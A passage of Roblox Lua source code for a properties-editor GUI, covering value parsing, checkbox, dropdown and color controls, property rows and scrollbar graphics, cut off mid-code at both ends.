		local xOffset = value.X.Offset
		local yScale = value.Y.Scale
		local yOffset = value.Y.Offset
		return string.format("{%d, %d}, {%d, %d}", xScale, xOffset, yScale, yOffset)
	else
		return tostring(value)
	end
end

local function ToValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Content" then
		if tonumber(value) ~= nil then
			value = ContentUrl .. value
		end
		return value
	elseif type == "float" or type == "int" or type == "double" then
		return tonumber(value)
	elseif type == "string" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	else
		return nil
	end
end


-- Tables

local function CopyTable(T)
  local t2 = {}
  for k,v in pairs(T) do
    t2[k] = v
  end
  return t2
end

local function SortTable(T)
	table.sort(T, 
		function(x,y) return x.Name < y.Name
	end)
end

-- Spritesheet
local Sprite = {
	Width = 13;
	Height = 13;
}

local Spritesheet = {
	Image = "http://www.roblox.com/asset/?id=128896947";
	Height = 256;
	Width = 256;
}

local Images = {
	"unchecked",
	"checked",
	"unchecked_over",
	"checked_over",
	"unchecked_disabled",
	"checked_disabled"
}

local function SpritePosition(spriteName)
	local x = 0
	local y = 0
	for i,v in pairs(Images) do
		if (v == spriteName) then
			return {x, y}
		end
		x = x + Sprite.Height
		if (x + Sprite.Width) > Spritesheet.Width then
			x = 0
			y = y + Sprite.Height
		end
	end
end

local function GetCheckboxImageName(checked, readOnly, mouseover)
	if checked then
		if readOnly then
			return "checked_disabled"
		elseif mouseover then
			return "checked_over"
		else
			return "checked"
		end
	else
		if readOnly then
			return "unchecked_disabled"
		elseif mouseover then
			return "unchecked_over"
		else
			return "unchecked"
		end
	end
end

local MAP_ID = 418720155

-- Gui Controls --

---- IconMap ----
-- Image size: 256px x 256px
-- Icon size: 16px x 16px
-- Padding between each icon: 2px
-- Padding around image edge: 1px
-- Total icons: 14 x 14 (196)
local Icon do
	local iconMap = 'http://www.roblox.com/asset/?id=' .. MAP_ID
	game:GetService('ContentProvider'):Preload(iconMap)
	local iconDehash do
		-- 14 x 14, 0-based input, 0-based output
		local f=math.floor
		function iconDehash(h)
			return f(h/14%14),f(h%14)
		end
	end

	function Icon(IconFrame,index)
		local row,col = iconDehash(index)
		local mapSize = Vector2.new(256,256)
		local pad,border = 2,1
		local iconSize = 16

		local class = 'Frame'
		if type(IconFrame) == 'string' then
			class = IconFrame
			IconFrame = nil
		end

		if not IconFrame then
			IconFrame = Create(class,{
				Name = "Icon";
				BackgroundTransparency = 1;
				ClipsDescendants = true;
				Create('ImageLabel',{
					Name = "IconMap";
					Active = false;
					BackgroundTransparency = 1;
					Image = iconMap;
					Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
				});
			})
		end

		IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
		return IconFrame
	end
end

local function CreateCell()
	local tableCell = Instance.new("Frame")
	tableCell.Size = UDim2.new(0.5, -1, 1, 0)
	tableCell.BackgroundColor3 = Row.BackgroundColor
	tableCell.BorderColor3 = Row.BorderColor
	return tableCell
end
	
local function CreateLabel(readOnly)
	local label = Instance.new("TextLabel")
	label.Font = Row.Font
	label.FontSize = Row.FontSize
	label.TextXAlignment = Row.TextXAlignment
	label.BackgroundTransparency = 1
	
	if readOnly then
		label.TextColor3 = Row.TextLockedColor
	else
		label.TextColor3 = Row.TextColor
	end
	return label
end

local function CreateTextButton(readOnly, onClick)
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	else
		button.TextColor3 = Row.TextColor
		button.MouseButton1Click:connect(function()
			onClick()
		end)
	end
	return button
end

local function CreateObject(readOnly)
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	else
		button.TextColor3 = Row.TextColor
	end
	local cancel = Create(Icon('ImageButton',177),{
		Name = "Cancel";
		Visible = false;
		Position = UDim2.new(1,-20,0,0);
		Size = UDim2.new(0,20,0,20);
		Parent = button;
	})
	return button
end

local function CreateTextBox(readOnly)
	if readOnly then
		local box = CreateLabel(readOnly)
		return box
	else
		local box = Instance.new("TextBox")
		if not SettingsRemote:Invoke("ClearProps") then
			box.ClearTextOnFocus = false
		end
		box.Font = Row.Font
		box.FontSize = Row.FontSize
		box.TextXAlignment = Row.TextXAlignment
		box.BackgroundTransparency = 1
		box.TextColor3 = Row.TextColor
		return box
	end
end

local function CreateDropDownItem(text, onClick)
	local button = Instance.new("TextButton")
	button.Font = DropDown.Font
	button.FontSize = DropDown.FontSize
	button.TextColor3 = DropDown.TextColor
	button.TextXAlignment = DropDown.TextXAlignment
	button.BackgroundColor3 = DropDown.BackColor
	button.AutoButtonColor = false
	button.BorderSizePixel = 0
	button.Active = true
	button.Text = text
	
	button.MouseEnter:connect(function()
		button.TextColor3 = DropDown.TextColorOver
		button.BackgroundColor3 = DropDown.BackColorOver
	end)
	button.MouseLeave:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
	end)
	button.MouseButton1Click:connect(function()
		onClick(text)
	end)	
	return button
end

local function CreateDropDown(choices, currentChoice, readOnly, onClick)
	local frame = Instance.new("Frame")	
	frame.Name = "DropDown"
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	
	local function showArrow(color)
		if arrow then arrow:Destroy() end
		
		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = Color3.new(1, 1, 1);
		})
		local graphicSize = 16/2
		
		arrow = ArrowGraphic(graphicSize,'Down',true,graphicTemplate)
		arrow.Position = UDim2.new(1,-graphicSize * 2,0.5,-graphicSize/2)
		arrow.Parent = frame
	end
	
	local function hideMenu()
		expanded = false
		showArrow(DropDown.ArrowColor)
		if menu then menu:Destroy() end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("Frame")
		menu.Size = UDim2.new(1, -2 * margin, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, Row.Height + margin)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		local parentFrameHeight = menu.Parent.Parent.Parent.Parent.Size.Y.Offset
		local rowHeight = menu.Parent.Parent.Parent.Position.Y.Offset
		if (rowHeight + menu.Size.Y.Offset) > math.max(parentFrameHeight,PropertiesFrame.AbsoluteSize.y) then
			menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateDropDownItem(name, function()
				choice(name)
			end)
			option.Size = UDim2.new(1, 0, 0, 16)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end
	
	showArrow(DropDown.ArrowColor)
	
	if not readOnly then
		
		button.MouseEnter:connect(function()
			button.TextColor3 = Row.TextColor
		end)
		button.MouseLeave:connect(function()
			button.TextColor3 = Row.TextColor
		end)
		button.MouseButton1Click:connect(function()
			if expanded then
				hideMenu()
			else
				showMenu()
			end
		end)
	end
	
	return frame,button
end

local function CreateBrickColor(readOnly, onClick)
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1,0,1,0)
	frame.BackgroundTransparency = 1
	
	local colorPalette = Instance.new("Frame")
	colorPalette.BackgroundTransparency = 0
	colorPalette.SizeConstraint = Enum.SizeConstraint.RelativeXX
	colorPalette.Size = UDim2.new(1, -2 * BrickColors.OuterBorder, 1, -2 * BrickColors.OuterBorder)
	colorPalette.BorderSizePixel = BrickColors.BorderSizePixel
	colorPalette.BorderColor3 = BrickColors.BorderColor
	colorPalette.Position = UDim2.new(0, BrickColors.OuterBorder, 0, BrickColors.OuterBorder + Row.Height)
	colorPalette.ZIndex = 5
	colorPalette.Visible = false
	colorPalette.BorderSizePixel = BrickColors.OuterBorder
	colorPalette.BorderColor3 = BrickColors.OuterBorderColor
	colorPalette.Parent = frame
	
	local function show()
		colorPalette.Visible = true
	end
	
	local function hide()
		colorPalette.Visible = false
	end
	
	local function toggle()
		colorPalette.Visible = not colorPalette.Visible
	end
	
	local colorBox = Instance.new("TextButton", frame)
	colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
	colorBox.Text = ""
	colorBox.MouseButton1Click:connect(function()
		if not readOnly then
			toggle()
		end
	end)
	
	if readOnly then
		colorBox.AutoButtonColor = false
	end
	
	local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize
	
	local propertyLabel = CreateTextButton(readOnly, function()
		if not readOnly then
			toggle()
		end
	end)
	propertyLabel.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
	propertyLabel.Position = UDim2.new(0, spacingBefore, 0, 0)
	propertyLabel.Parent = frame
	
	local size = (1 / BrickColors.ColorsPerRow)
	
	for index = 0, 127 do
		local brickColor = BrickColor.palette(index)
		local color3 = brickColor.Color
		
		local x = size * (index % BrickColors.ColorsPerRow)
		local y = size * math.floor(index / BrickColors.ColorsPerRow)
	
		local brickColorBox = Instance.new("TextButton")
		brickColorBox.Text = ""
		brickColorBox.Size = UDim2.new(size,0,size,0)
		brickColorBox.BackgroundColor3 = color3
		brickColorBox.Position = UDim2.new(x, 0, y, 0)
		brickColorBox.ZIndex = colorPalette.ZIndex
		brickColorBox.Parent = colorPalette
	
		brickColorBox.MouseButton1Click:connect(function()
			hide()
			onClick(brickColor)
		end)
	end
	
	return frame,propertyLabel,colorBox
end

local function CreateColor3Control(readOnly, onClick)
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1,0,1,0)
	frame.BackgroundTransparency = 1
	
	local colorBox = Instance.new("TextButton", frame)
	colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
	colorBox.Text = ""
	colorBox.AutoButtonColor = false
	
	local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize
	local box = CreateTextBox(readOnly)
	box.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, spacingBefore, 0, 0)
	box.Parent = frame
	
	return frame,box,colorBox
end

function CreateCheckbox(value, readOnly, onClick)
	local checked = value
	local mouseover = false

	local checkboxFrame = Instance.new("ImageButton")
	checkboxFrame.Size = UDim2.new(0, Sprite.Width, 0, Sprite.Height)
	checkboxFrame.BackgroundTransparency = 1
	checkboxFrame.ClipsDescendants = true
	--checkboxFrame.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)

	local spritesheetImage = Instance.new("Frame", checkboxFrame);
	spritesheetImage.Name = "SpritesheetImageLabel";
	spritesheetImage.Size = UDim2.new(0, Spritesheet.Width, 0, Spritesheet.Height);
	spritesheetImage.BorderSizePixel = 0;
	spritesheetImage.BackgroundColor3 = Color3.fromRGB(113, 45, 59);

	local checkedImage = Instance.new("Frame", checkboxFrame);
	checkedImage.Name = "CheckedImageLabel";
	checkedImage.AnchorPoint = Vector2.new(0.5, 0.5);
	checkedImage.Position = UDim2.new(0.5, 0, 0.5, 0);
	checkedImage.Size = UDim2.new(0, 9, 0, 9);
	checkedImage.BorderSizePixel = 0;
	checkedImage.BackgroundColor3 = Color3.fromRGB(197, 28, 70);
	checkedImage.Visible = checked;
	
	local function updateSprite()
		checkedImage.Visible = checked;
	end
	
	local function setValue(val)
		checked = val
		updateSprite()
	end

	if not readOnly then
		--checkboxFrame.MouseEnter:connect(function() mouseover = true updateSprite() end)
		--checkboxFrame.MouseLeave:connect(function() mouseover = false updateSprite() end)
		checkboxFrame.MouseButton1Click:connect(function()
			onClick(checked)
		end)
	end
	
	updateSprite()
	
	return checkboxFrame, setValue
end



-- Code for handling controls of various data types --

local Controls = {}

Controls["default"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local box = CreateTextBox(readOnly)
	box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, Styles.Margin, 0, 0)

	local function update()
		local value = object[propertyName]
		box.Text = ToString(value, propertyType)
	end
	
	if not readOnly then
		box.FocusLost:connect(function(enterPressed)
			Set(object, propertyData, ToValue(box.Text,propertyType))
			update()
		end)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return box
end

Controls["bool"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local checked = object[propertyName]
	
	local checkbox, setValue = CreateCheckbox(checked, readOnly, function(value)
		Set(object, propertyData, not checked)
	end)
	checkbox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	
	setValue(checked)
	
	local function update()
		checked = object[propertyName]
		setValue(checked)
	end
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	if object:IsA("BoolValue") then
		object.Changed:connect(function(val)
			update()
		end)
	end
	
	update()
	
	return checkbox
end

Controls["BrickColor"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]

	local frame,label,brickColorBox = CreateBrickColor(readOnly, function(brickColor)
		Set(object, propertyData, brickColor)
	end)
	
	local function update()
		local value = object[propertyName]
		brickColorBox.BackgroundColor3 = value.Color
		label.Text = tostring(value)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return frame
end

Controls["Color3"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]

	local frame,textBox,colorBox = CreateColor3Control(readOnly)
	
	textBox.FocusLost:connect(function(enterPressed)
		Set(object, propertyData, ToValue(textBox.Text,"Color3"))
		local value = object[propertyName]
		colorBox.BackgroundColor3 = value
		textBox.Text = ToString(value, "Color3")
	end)
			
	local function update()
		local value = object[propertyName]
		colorBox.BackgroundColor3 = value
		textBox.Text = ToString(value, "Color3")
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return frame
end

Controls["Enum"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local enumName = object[propertyName].Name
	
	local enumNames = {}
	for _,enum in pairs(Enum[tostring(propertyType)]:GetEnumItems()) do
		table.insert(enumNames, enum.Name)
	end
	
	local dropdown, propertyLabel = CreateDropDown(enumNames, enumName, readOnly, function(value)
		Set(object, propertyData, value)
	end)
	--dropdown.Parent = frame
	
	local function update()
		local value = object[propertyName].Name
		propertyLabel.Text = tostring(value)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return dropdown
end

Controls["Object"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local box = CreateObject(readOnly,function()end)
	box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, Styles.Margin, 0, 0)

	local function update()
		if AwaitingObjectObj == object then
			if AwaitingObjectValue == true then
				box.Text = "Select an Object"
				return
			end
		end
		local value = object[propertyName]
		box.Text = ToString(value, propertyType)
	end
	
	if not readOnly then
		box.MouseButton1Click:connect(function()
			if AwaitingObjectValue then
				AwaitingObjectValue = false
				update()
				return
			end
			AwaitingObjectValue = true
			AwaitingObjectObj = object
			AwaitingObjectProp = propertyData
			box.Text = "Select an Object"
		end)
		
		box.Cancel.Visible = true
		box.Cancel.MouseButton1Click:connect(function()
			object[propertyName] = nil
		end)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	if object:IsA("ObjectValue") then
		object.Changed:connect(function(val)
			update()
		end)
	end
	
	return box
end

function GetControl(object, propertyData, readOnly)
	local propertyType = propertyData["ValueType"]
	local control = nil
	
	if Controls[propertyType] then
		control = Controls[propertyType](object, propertyData, readOnly)
	elseif RbxApi.IsEnum(propertyType) then
		control = Controls["Enum"](object, propertyData, readOnly)
	else
		control = Controls["default"](object, propertyData, readOnly)
	end
	return control
end
-- Permissions

function CanEditObject(object)
	local player = Players.LocalPlayer
	local character = player.Character
	return Permissions.CanEdit
end

function CanEditProperty(object,propertyData)
	local tags = propertyData["tags"]
	for _,name in pairs(tags) do
		if name == "readonly" then
			return false
		end
	end
	return CanEditObject(object)
end

--RbxApi
local function PropertyIsHidden(propertyData)
	local tags = propertyData["tags"]
	for _,name in pairs(tags) do
		if name == "deprecated"
			or name == "hidden"
			or name == "writeonly" then
			return true
		end
	end
	return false
end

function Set(object, propertyData, value)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	if value == nil then return end
	
	for i,v in pairs(GetSelection()) do
		if CanEditProperty(v,propertyData) then
			pcall(function()
				--print("Setting " .. propertyName .. " to " .. tostring(value))
				v[propertyName] = value
			end)
		end
	end
end

function CreateRow(object, propertyData, isAlternateRow)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	local propertyValue = object[propertyName]
	--rowValue, rowValueType, isAlternate
	local backColor = Row.BackgroundColor;
	if (isAlternateRow) then
		backColor = Row.BackgroundColorAlternate
	end
	
	local readOnly = not CanEditProperty(object, propertyData)
	if propertyType == "Instance" or propertyName == "Parent" then readOnly = true end

	local rowFrame = Instance.new("Frame")
	rowFrame.Size = UDim2.new(1,0,0,Row.Height)
	rowFrame.BackgroundTransparency = 1
	rowFrame.Name = 'Row'

	local propertyLabelFrame = CreateCell()
	propertyLabelFrame.Parent = rowFrame
	propertyLabelFrame.ClipsDescendants = true
	
	local propertyLabel = CreateLabel(readOnly)
	propertyLabel.Text = propertyName
	propertyLabel.Size = UDim2.new(1, -1 * Row.TitleMarginLeft, 1, 0)
	propertyLabel.Position = UDim2.new(0, Row.TitleMarginLeft, 0, 0)
	propertyLabel.Parent = propertyLabelFrame

	local propertyValueFrame = CreateCell()
	propertyValueFrame.Size = UDim2.new(0.5, -1, 1, 0)
	propertyValueFrame.Position = UDim2.new(0.5, 0, 0, 0)
	propertyValueFrame.Parent = rowFrame

	local control = GetControl(object, propertyData, readOnly)
	control.Parent = propertyValueFrame

	rowFrame.MouseEnter:connect(function()
		propertyLabelFrame.BackgroundColor3 = Row.BackgroundColorMouseover
		propertyValueFrame.BackgroundColor3 = Row.BackgroundColorMouseover
	end)
	rowFrame.MouseLeave:connect(function()
		propertyLabelFrame.BackgroundColor3 = backColor
		propertyValueFrame.BackgroundColor3 = backColor
	end)
	
	propertyLabelFrame.BackgroundColor3 = backColor
	propertyValueFrame.BackgroundColor3 = backColor
	
	return rowFrame
end

function ClearPropertiesList()
	for _,instance in pairs(ContentFrame:GetChildren()) do
		instance:Destroy()
	end
end

local selection = Gui:FindFirstChild("Selection", 1)

function displayProperties(props)
	for i,v in pairs(props) do
		pcall(function()
			local a = CreateRow(v.object, v.propertyData, ((numRows % 2) == 0))
			a.Position = UDim2.new(0,0,0,numRows*Row.Height)
			a.Parent = ContentFrame
			numRows = numRows + 1
		end)
	end
end

function checkForDupe(prop,props)
	for i,v in pairs(props) do
		if v.propertyData.Name == prop.Name and v.propertyData.ValueType == prop.ValueType then
			return true
		end
	end
	return false
end

function sortProps(t)
	table.sort(t, 
		function(x,y) return x.propertyData.Name < y.propertyData.Name
	end)
end

function showProperties(obj)
	ClearPropertiesList()
	if obj == nil then return end
	local propHolder = {}
	local foundProps = {}
	numRows = 0
	for _,nextObj in pairs(obj) do
		if not foundProps[nextObj.className] then
			foundProps[nextObj.className] = true
			for i,v in pairs(RbxApi.GetProperties(nextObj.className)) do
				local suc, err = pcall(function()
					if not (PropertyIsHidden(v)) and not checkForDupe(v,propHolder) then
						if string.find(string.lower(v.Name),string.lower(propertiesSearch.Text)) or not searchingProperties() then
							table.insert(propHolder,{propertyData = v, object = nextObj})
						end
					end
				end)
				--[[if not suc then 
					warn("Problem getting the value of property " .. v.Name .. " | " .. err)
				end	--]]
			end
		end
	end
	sortProps(propHolder)
	displayProperties(propHolder)
	ContentFrame.Size = UDim2.new(1, 0, 0, numRows * Row.Height)
	scrollBar.ScrollIndex = 0
	scrollBar.TotalSpace = numRows * Row.Height
	scrollBar.Update()
end

----------------------------------------------------------------
-----------------------SCROLLBAR STUFF--------------------------
----------------------------------------------------------------
----------------------------------------------------------------
local ScrollBarWidth = 16

local ScrollStyles = {
	Background      = Color3.fromRGB(233, 233, 233);
	Border          = Color3.fromRGB(149, 149, 149);
	Selected        = Color3.fromRGB( 63, 119, 189);
	BorderSelected  = Color3.fromRGB( 55, 106, 167);
	Text            = Color3.fromRGB(  0,   0,   0);
	TextDisabled    = Color3.fromRGB(128, 128, 128);
	TextSelected    = Color3.fromRGB(255, 255, 255);
	Button          = Color3.fromRGB( 35,  35,  35);
	ButtonBorder    = Color3.fromRGB(149, 149, 149);
	ButtonSelected  = Color3.fromRGB(255,   0,   0);
	Field           = Color3.fromRGB(255, 255, 255);
	FieldBorder     = Color3.fromRGB(191, 191, 191);
	TitleBackground = Color3.fromRGB(178, 178, 178);
}
do
	local ZIndexLock = {}
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end
end
function SetZIndexOnChanged(object)
	return object.Changed:connect(function(p)
		if p == "ZIndex" then
			SetZIndex(object,object.ZIndex)
		end
	end)
end
function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end
-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end
-- AutoButtonColor doesn't always reset properly
function ResetButtonColor(button)
	local active = button.Active
	button.Active = not active
	button.Active = active
end

function ArrowGraphic(size,dir,scaled,template)
	local Frame = Create('Frame',{
		Name = "Arrow Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size,0,size);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	template.BackgroundColor3 = Color3.new(1, 1, 1);

	local transform
	if dir == nil or dir == 'Up' then
		function transform(p,s) return p,s end
	elseif dir == 'Down' then
		function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
	elseif dir == 'Left' then
		function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	elseif dir == 'Right' then
		function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	end

	local scale
	if scaled then
		function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
	else
		function scale(p,s) return p,s end
	end

	local o = math.floor(size/4)
	if size%2 == 0 then
		local n = size/2-1
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,(i+1)*2,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	else
		local n = (size-1)/2
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,i*2+1,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	end
	if size%4 > 1 then
		local t = template:Clone()
		local p,s = scale(transform(
			UDim2.new(0,0,0,size-o-1),
			UDim2.new(0,size,0,1)
		))
		t.Position = p
		t.Size = s
		t.Parent = Frame
	end

	for i,v in pairs(Frame:GetChildren()) do
		v.BackgroundColor3 = Color3.new(1, 1, 1);
	end

	return Frame
end

function GripGraphic(size,dir,spacing,scaled,template)
	local Frame = Create('Frame',{
		Name = "Grip Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size.x,0,size.y);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	spacing = spacing or 2

	local scale
	if scaled then
		function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
	else
		function scale(p) return p end
	end

	if dir == 'Vertical' then
		for i=0,size.x-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,1,0,size.y))
			t.Position = scale(UDim2.new(0,i,0,0))
			t.Parent = Frame
		end
	elseif dir == nil or dir == 'Horizontal' then
		for i=0,size.y-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,size.x,0,1))
			t.Position = scale(UDim2.new(0,0,0,i))
			t.Parent = Frame
		end
	end

	return Frame
end

do
	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
			Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
				Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.fromRGB(20, 20, 20);
				BorderColor3 = ScrollStyles.Border;
				BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
					BackgroundColor3 = ScrollStyles.Button;
					BorderColor3 = ScrollStyles.Border;
